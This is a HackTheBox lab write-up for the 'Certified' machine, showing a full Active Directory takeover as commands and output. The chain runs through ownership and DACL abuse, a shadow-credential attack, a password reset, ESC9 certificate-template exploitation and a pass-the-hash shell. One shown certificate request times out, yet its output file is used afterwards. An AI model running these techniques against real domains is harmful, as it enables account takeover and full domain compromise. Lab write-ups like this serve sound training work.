---
title: "HackTheBox - Certified"
author: Nasrallah
description: ""
date: 2025-03-15 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, ad, ca, certipy]
img_path: /assets/img/hackthebox/machines/certified
image:
    path: certified.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Certified](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/certified) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) starts by giving us credentials to an active directory environment where we find multiple "misconfigurations" allowing us escalate our privileges with exploiting a certificate at the end to get administrator access.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Host is up (0.13s latency).                                                                                                                                                           [13/419]
Not shown: 989 filtered tcp ports (no-response) 
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-06 23:10:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC           
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36                                                        
|_Not valid after:  2025-05-13T15:49:36                                                        
|_ssl-date: 2024-12-06T23:12:11+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?             
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-12-06T23:12:09+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-06T23:12:11+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-06T23:12:09+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-06T23:11:32
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

The target is active directory and we were given the credentials `judith.mader:judith09`.

Let's add the domain `certified.htb` to our `/etc/hosts` file.

First thing I'll do is check whether we can log in via `winrm` or not. We can use `netexec` for that.

```terminal
[★]$ nxc winrm certified.htb -u judith.mader -p 'judith09'
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\judith.mader:judith09
```

We can't, let's check smb server.

```terminal
[★]$ nxc smb certified.htb -u judith.mader -p 'judith09' --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
```

There are no interesting shares with read permission, so we move on.

### Bloodhound

Let's bloodhound.py.

```terminal
bloodhound.py -d certified.htb -u judith.mader -p judith09 -ns 10.10.11.41 -dc certified.htb -c all

INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 24S
```

We got couple json file, I'll zip them using the following command:

```bash
zip data.zip ./*.json
```

Now let's open bloodhound and see what we have.

![blood](1.png)

We select user `judith.mader` and then go to `Node info` and click on `Reachable high value targets`.

This shows us the full path to follow to pwn the domain.

## **Foothold**

### WriteOwner

The user `JUDITH.MADER` has the ability to modify the owner of the group `MANAGEMENT`. Let's exploit that.

We are going to set ourselves (judith.mader) as the group owner, then grant us `FullControl` and then add ourselves to the group.

For the first part we can use `impacket owneredit` script to change the ownership of the group.

```bash
owneredit.py -action write -new-owner judith.mader -target Management certified.htb/judith.mader:judith09
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Now we grant ourselves `FullControl` using `dacledit.py`.

```bash
dacledit.py -action write -principal 'judith.mader' -target management -rights FullControl 'certified.htb/judith.mader:judith09'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250101-084216.bak
[*] DACL modified successfully!
```

And now we add the user to the group using `net`.

```bash
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "certified.htb"
```

We can check if we've been added to the `management` group by listing the users on that group using the following command.

```bash
net rpc group members "management" -U "certified.htb"/"judith.mader"%"judith09" -S "certified.htb"
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

We see that `judith.mader` is part of the `management` group.

Now that we are part of the `Management` group, let's move to the next part.

### GenericWrite

The members of the group `MANAGEMENT` have generic write access to the user `MANAGEMENT_SVC`.

>Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
{: .prompt-info }

To exploit this, we can use `certipy` to perform a shadow credential attack.

```bash
certipy shadow auto -account management_svc -u 'judith.mader@certified.htb' -p 'judith09' -dc-ip 10.10.11.41
```

Running the command gives us the `Clock skew too great`, we fix that with `sudo rdate -n certified.htb`.

```bash
certipy shadow auto -account management_svc -u 'judith.mader@certified.htb' -p 'judith09' -dc-ip 10.10.11.41

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '953ca321-366f-5cca-40f3-e920effdfce7'
[*] Adding Key Credential with device ID '953ca321-366f-5cca-40f3-e920effdfce7' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '953ca321-366f-5cca-40f3-e920effdfce7' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

We got the nt hash of user `management_svc`, let's see if we can authenticate with it.

```bash
nxc winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584     

WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```

It worked and we can login via winrm for a shell

```bash
evil-winrm -i certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
                                         
Evil-WinRM shell v3.5
                                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

## **Privilege Escalation**

### ca-operator

Going back to bloodhound we find that user `management_svc` has `GenericAll` over user `ca-operator`.

We can change the user's password using the following command.

```bash
net rpc password "ca_operator" "P@ssword123" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584" -S "certified.htb" --pw-nt-hash
```

The ca_operator doesn't have remote access to the machine.

Let's scan for vulnerable certificates.

```bash
certipy find -vulnerable -u ca_operator -p 'P@ssword123' -dc-ip 10.10.11.41 -stdout                                                 
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                         
                                                                                               
[*] Finding certificate templates                                                              
[*] Found 34 certificate templates                                                             
[*] Finding certificate authorities                                                                                                                                                           
[*] Found 1 certificate authority             
[*] Found 12 enabled certificate templates                                                     
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA                                                                                                                           
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.                         
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP                           
[*] Got CA configuration for 'certified-DC01-CA'              
[*] Enumeration output:                                                                        
Certificate Authorities  
    CA Name                             : certified-DC01-CA                                   
    DNS Name                            : DC01.certified.htb   
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D                                                                                                                    
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue 
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False 
    Any Purpose                         : False 
    Enrollee Supplies Subject           : False 
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False 
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension

```

We find the CA `certified-DC01-CA` vulnerable to [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension).

We need to run the following commands to exploit this CA.

```bash
certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn administrator
certipy req -username "ca_operator@certified.htb" -p 'P@ssword123' -target "10.10.11.41" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn ca_operator
certipy auth -pfx 'administrator.pfx' -domain "certified.htb"
```

```terminal
──╼[★]$ certipy req -username "ca_operator@certified.htb" -p 'P@ssword123' -target "10.10.11.41" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                         
                                               
[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace      


──╼[★]$ certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)                                                         
                                               
[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'



──╼[★]$ certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator
[*] Successfully updated 'ca_operator'


──╼[★]$ certipy auth -pfx 'administrator.pfx' -domain "certified.htb"                                                                                
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

We got the administrator's hash, now let's pass the hash to get a shell.

```terminal
──╼[★]$ evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34   
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## **References**

<https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
